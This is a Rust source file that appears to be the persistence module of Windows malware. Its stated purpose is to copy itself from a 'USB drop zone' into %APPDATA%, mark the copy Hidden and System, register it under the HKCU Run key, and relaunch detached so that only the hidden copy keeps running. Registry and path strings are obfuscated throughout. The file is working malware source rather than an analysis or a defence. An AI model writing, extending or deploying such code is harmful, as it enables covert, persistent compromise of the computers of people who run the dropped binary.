//! Persistence: copy self out of the USB drop zone into %APPDATA%,
//! set Hidden+System, register HKCU Run, relaunch detached, exit.
//! No admin needed. Idempotent: if already running from install path,
//! just re-assert the Run key and continue.
#![cfg(windows)]

use std::os::windows::process::CommandExt;
use std::path::PathBuf;

use windows::core::PCWSTR;
use windows::Win32::Foundation::ERROR_SUCCESS;
use windows::Win32::Storage::FileSystem::{
    SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM,
};
use windows::Win32::System::Registry::{
    RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_WRITE,
    REG_OPTION_NON_VOLATILE, REG_SZ,
};

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

pub fn install_path() -> Option<PathBuf> {
    let appdata = std::env::var_os("APPDATA")?;
    let mut p = PathBuf::from(appdata);
    p.push(crate::obf::de(crate::obf::P_INSTALL_DIR));
    p.push(crate::obf::de(crate::obf::P_INSTALL_BIN));
    Some(p)
}

pub fn install() {
    let Some(dst) = install_path() else { return };
    let cur = std::env::current_exe().ok();

    // Already home: re-assert the Run key, keep running.
    if cur.as_ref().is_some_and(|c| c == &dst) {
        set_run_key(&dst);
        return;
    }

    if let Some(parent) = dst.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let src = match cur {
        Some(c) => c,
        None => return,
    };
    if std::fs::copy(&src, &dst).is_err() {
        return; // e.g. read-only target profile — run in place this once
    }
    hide(&dst);
    set_run_key(&dst);

    // Relaunch detached from the install path, then exit so the
    // double-clicked copy dies and only the hidden copy keeps running.
    // DETACHED_PROCESS only: CREATE_NO_WINDOW is mutually exclusive with it,
    // and the binary is already a GUI-subsystem build (no console).
    let _ = std::process::Command::new(&dst)
        .creation_flags(0x0000_0008) // DETACHED_PROCESS
        .spawn();
    std::process::exit(0);
}

fn hide(p: &PathBuf) {
    let w = wide(&p.to_string_lossy());
    unsafe {
        let _ = SetFileAttributesW(
            PCWSTR(w.as_ptr()),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        );
    }
}

fn set_run_key(dst: &PathBuf) {
    unsafe {
        let sub = wide(&crate::obf::de(crate::obf::P_RUN_KEY_PATH));
        let mut key = HKEY::default();
        // RegCreateKeyExW returns WIN32_ERROR (not Result) in windows-rs 0.58.
        if RegCreateKeyExW(
            HKEY_CURRENT_USER,
            PCWSTR(sub.as_ptr()),
            0,
            PCWSTR::null(),
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            None,
            &mut key,
            None,
        ) != ERROR_SUCCESS
        {
            return;
        }
        // REG_SZ value: UTF-16, length in *bytes*, null terminator included.
        let val = wide(&format!("\"{}\"", dst.to_string_lossy()));
        let bytes: &[u8] = std::slice::from_raw_parts(val.as_ptr() as *const u8, val.len() * 2);
        let name = wide(&crate::obf::de(crate::obf::P_RUN_VALUE));
        let _ = RegSetValueExW(key, PCWSTR(name.as_ptr()), 0, REG_SZ, Some(bytes));
        let _ = RegCloseKey(key);
    }
}
